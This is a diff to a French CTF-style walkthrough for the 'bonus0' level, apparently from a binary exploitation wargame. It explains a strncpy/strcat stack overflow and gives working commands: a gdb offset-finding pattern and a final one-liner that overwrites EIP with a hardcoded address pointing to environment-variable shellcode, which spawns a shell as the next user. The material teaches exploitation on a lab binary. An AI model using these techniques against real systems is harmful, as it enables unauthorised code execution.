@@ -1,17 +1,27 @@
 # Bonus0 — Walkthrough
 
-## Protections du binaire
+> **En résumé :** `main` appelle `pp`, qui lit deux mots via `p` puis les concatène. Le bug vient de `p` : son `strncpy` de 20 octets ne pose pas de `\0` final, donc le premier mot « déborde » sur le second, la concaténation dépasse le buffer de 54 octets et écrase EIP → shellcode.
 
+```mermaid
+flowchart TD
+    A["main()<br/>result[54]"] --> B["pp(result)"]
+    B --> C["p(mot1, ' - ')<br/>lit le 1er mot → 20 octets"]
+    B --> D["p(mot2, ' - ')<br/>lit le 2e mot → 20 octets"]
+
+    C -- "input = 20 chars" --> E["mot1 SANS '\0' final<br/>(strncpy n'en pose pas)"]
+
+    E --> F["strcpy(result, mot1)<br/>ne trouve pas de '\0'<br/>→ continue dans mot2<br/>→ copie 40 octets"]
+    D --> F
+
+    F --> G["+ ' ' + strcat(result, mot2)<br/>[mot1 20][mot2 20][' '][mot2 20] + '\0'<br/>= 40 + 1 + 20 + 1 = 62 octets dans result[54]"]
+    G --> H["DÉBORDEMENT<br/>EIP (adresse de retour) écrasée"]
+    H --> I["EIP → NOP sled (variable d'env)<br/>→ shellcode → shell bonus1"]
+
+    style E fill:#ffe0b2,stroke:#e65100
+    style F fill:#ffcdd2,stroke:#b71c1c
+    style H fill:#ffcdd2,stroke:#b71c1c
+    style I fill:#c8e6c9,stroke:#1b5e20
 ```
-checksec --file ~/bonus0
-
-RELRO           STACK CANARY      NX            PIE
-No RELRO        No canary found   NX disabled   No PIE
-```
-
-Pas de canary, NX désactivé → on peut exécuter du shellcode sur la stack.
-
----
 
 ## Analyse du code
 
@@ -90,6 +100,14 @@ adresses croissantes →
 
 62 bytes écrits → on écrase EIP. ✓
 
+> **Le but de tout l'exploit : contrôler EIP.**
+> EIP est le registre qui contient l'**adresse de la prochaine instruction à
+> exécuter** — le « doigt » que le CPU suit dans le code. Quand une fonction se
+> termine (`ret`), le CPU charge dans EIP l'**adresse de retour** stockée sur la
+> pile. En débordant `result`, on écrase justement cette adresse de retour :
+> au `ret`, le CPU saute donc là où **nous** voulons (notre shellcode) au lieu
+> de revenir dans `main`. Maîtriser EIP = maîtriser ce que la machine exécute.
+
 ---
 
 ## Trouver l'offset
@@ -97,18 +115,26 @@ adresses croissantes →
 On envoie un pattern reconnaissable pour identifier quels bytes atterrissent dans EIP :
 
 ```bash
-(python -c "print 'A'*20"; python -c "print 'BBBBCCCCDDDDEEEEFFFFGG'") | gdb -q ~/bonus0 -ex run -ex "info registers"
+(python -c "print 'A'*20"; sleep 1; python -c "print 'BBBBCCCCDDDDEEEEFFFFGG'"; cat) | gdb -q ~/bonus0 -ex run -ex "info registers eip"
 ```
 
-Crash à `0x45444444` → bytes en mémoire : `44 44 44 45` = `D D D E`
+> ⚠️ Le `sleep 1` est **indispensable**. `read()` lit jusqu'à 4096 octets d'un
+> coup : sans pause, le 1er `read()` avale les DEUX mots, et le 2e `read()`
+> tombe sur EOF → `strchr` renvoie NULL → crash dans `p()` (et non sur EIP).
+> Le `sleep` sépare les deux écritures pour que chaque `read()` ait son mot.
+> Le `cat` final garde stdin ouvert.
+
+Crash à `0x45444444` → bytes en mémoire (little-endian) : `44 44 44 45` = `D D D E`
 
 ```
-BBBBCCCCDDDDEEEEFFFFGG
-         ^   ^
-         9   12  ← positions dans le 2ème input
+position : 0123456789...
+input    : BBBBCCCCDDDDEEEEFFFFGG
+                    ^^^^
+                    9  12   ← "DDDE" = octets posés sur EIP (index à partir de 0)
 ```
 
-Les bytes aux **positions 9 à 12 du 2ème input** atterrissent dans EIP.
+Les bytes aux **positions 9 à 12 (index 0) du 2ème input** atterrissent dans EIP.
+C'est donc là qu'on placera l'adresse de retour : `'A'*9 + <adresse> + 'A'*7` (9 + 4 + 7 = 20).
 
 ---
 
@@ -173,10 +199,11 @@ gcc /tmp/getenv.c -o /tmp/getenv
 ### Étape 4 — Lancer l'exploit
 
 ```bash
-(python -c "print 'A'*20"; python -c "print 'A'*9 + '\xa3\xf8\xff\xbf' + 'A'*7"; cat) | ~/bonus0
+(python -c "print 'A'*20"; sleep 1; python -c "print 'A'*9 + '\xa3\xf8\xff\xbf' + 'A'*7"; cat) | ~/bonus0
 ```
 
-Le `cat` final garde stdin ouvert pour que le shell puisse recevoir des commandes.
+Le `sleep 1` sépare les deux `read()` (cf. section « Trouver l'offset »), et le
+`cat` final garde stdin ouvert pour que le shell puisse recevoir des commandes.
 
 ```bash
 whoami          # → bonus1
